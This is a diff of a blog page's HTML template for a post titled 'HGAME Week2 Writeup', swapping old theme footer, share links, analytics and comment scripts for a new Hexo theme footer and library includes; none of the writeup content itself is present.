-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://oyiadin.github.io/2018/writeup-of-hgame-week2/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&text=HGAME Week2 Writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&is_video=false&description=HGAME Week2 Writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=HGAME Week2 Writeup&body=Check out this article: https://oyiadin.github.io/2018/writeup-of-hgame-week2/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&name=HGAME Week2 Writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      <ul>
-        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
-        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
-        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
-        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
-      </ul>
-    </div>
-
-  </div>
 </div>
 
+<footer>
+    <p>
+        &copy;&nbsp;2018&nbsp;<a target="_blank"
+                                                               href="">oyiadin</a>
+    </p>
+
     
-    <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2018 oyiadin
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="../../index.html">Home</a></li>
-         
-          <li><a href="../../archives/">Archives</a></li>
-         
-          <li><a href="../../about/">About</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+    <p>Theme&nbsp;<a target="_blank"
+                     href="https://github.com/SumiMakito/hexo-theme-journal">Journal.</a>&nbsp;by&nbsp;<a
+                target="_blank" href="https://www.keep.moe">Makito</a>
+    </p>
+    
+
+    <p>
+        Proudly published with&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>
+    </p>
 </footer>
+
+</div>
+</div>
+</div>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="../../js/popper.min.js"></script>
+<script src="../../js/bootstrap.min.js"></script>
+<script src=" ../../js/vue.min.js"></script>
+<script src=" ../../js/journal.js"></script>
+<script>
+    loadCSS("//fonts.googleapis.com/css?family=Source+Sans+Pro:400|Montserrat|Anonymous+Pro:400|Material+Icons");
+</script>
+
+
+<script>
+    $(document).ready(function () {
+        $("#global-loading-indicator").fadeOut(600);
+    });
+</script>
 
 </body>
 </html>
-<!-- styles -->
-<link rel="stylesheet" href="../../lib/font-awesome/css/font-awesome.min.css">
-<link rel="stylesheet" href="../../lib/meslo-LG/styles.css">
-<link rel="stylesheet" href="../../lib/justified-gallery/justifiedGallery.min.css">
-
-<!-- jquery -->
-<script src="../../lib/jquery/jquery.min.js"></script>
-<script src="../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
-<script src="../../js/main.js"></script>
-<!-- search -->
-
-<!-- Google Analytics -->
-
-    <script type="text/javascript">
-        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-        ga('create', 'UA-86660611-1', 'auto');
-        ga('send', 'pageview');
-    </script>
-
-<!-- Disqus Comments -->
-
-    <script type="text/javascript">
-        var disqus_shortname = 'oyiadin';
-
-        (function(){
-            var dsq = document.createElement('script');
-            dsq.type = 'text/javascript';
-            dsq.async = true;
-            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-        }());
-    </script>
-
-
